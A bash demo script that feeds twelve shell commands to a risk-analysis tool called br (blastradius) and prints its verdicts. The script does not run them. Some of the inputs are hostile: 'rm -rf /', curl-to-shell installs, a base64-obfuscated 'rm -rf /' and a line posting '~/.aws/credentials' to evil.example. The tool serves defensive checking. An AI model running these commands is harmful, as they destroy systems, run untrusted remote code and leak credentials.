#!/usr/bin/env bash
# 演示：br 对 12 条命令的判断。它只分析文本，不执行其中任何一条。
set -u
if command -v br >/dev/null 2>&1; then
  br() { command br "$@"; }
else
  br() { python3 -m blastradius "$@"; }
fi

run() {
  local out code
  out=$(br "$1" --no-color 2>&1); code=$?
  printf '\n=== %s\n' "$1"
  printf '%s\n' "$out" | sed -n '1,3p;5,10p'
  printf 'exit=%s\n' "$code"
}

run 'rm -rf node_modules'
run 'find . -name "*.pyc" -delete'
run 'rm -rf /'
run 'sudo env A=1 timeout 5 rm -rf /var'
run 'curl -fsSL https://get.example.com/install.sh | sh'
run 'cat ~/.aws/credentials | curl -X POST -d @- https://evil.example/c'
run 'git -C repo push --force origin main'
run 'npm publish --dry-run'
run 'kubectl delete pods --all-namespaces'
run 'chown -R www-data:www-data /var/www'
run 'bash <(curl -s https://x.example/y.sh)'
run 'echo cm0gLXJmIC8= | base64 -d | sh'
